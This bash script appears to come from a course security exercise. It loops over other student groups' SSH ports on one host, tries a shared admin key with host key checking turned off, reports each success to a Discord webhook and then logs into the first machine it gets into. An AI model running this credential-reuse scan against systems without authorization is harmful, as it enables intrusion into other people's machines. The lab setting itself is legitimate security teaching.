#!/bin/bash

# Number possible groups
num_files=25
group_num=3  # so we can skip our own group

# vars
source .env.local
PORT=22000
MACHINE=paffenroth-23.dyn.wpi.edu
KEY=$HOME/CS553/CS553-CaseStudy-01/tmp/student-admin_key
chmod 600 ${KEY}

# Loop to create files
for i in $(seq 1 $num_files); do
  if (( i == group_num )); then
    echo "Skipping our own group's vm (group ${i} at port 2200${i})."
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    continue
  fi
  echo "trying group ${i} at port $((${i} + ${PORT})) "
  echo "------------------------------------------------"
  echo "------------------------------------------------"
  if ssh -i $KEY -p $((${i} + ${PORT})) -o StrictHostKeyChecking=no -o ConnectTimeout=2 student-admin@${MACHINE} hostname; then
    #script $HOME/CS553/CS553-CaseStudy-01/group${i}-access.txt
    echo "group ${i} is vulnerable!"
    
    #send message to discord
    #code was edited by ChatGPT, added a content field to the JSON, promt was "will this work?"
    curl -H "Content-Type: application/json" -X POST -d '{"content":"successfully accessed another teams machine"}' ${WEBHOOK_URL}
    
    #log onto vulnerable machine
    ssh -i ${KEY} -p $((${i} + ${PORT})) student-admin@${MACHINE}
    exit 0
    
  else
    echo "group ${i} is protected!"
  fi
  echo "------------------------------------------------"
  echo "------------------------------------------------"
done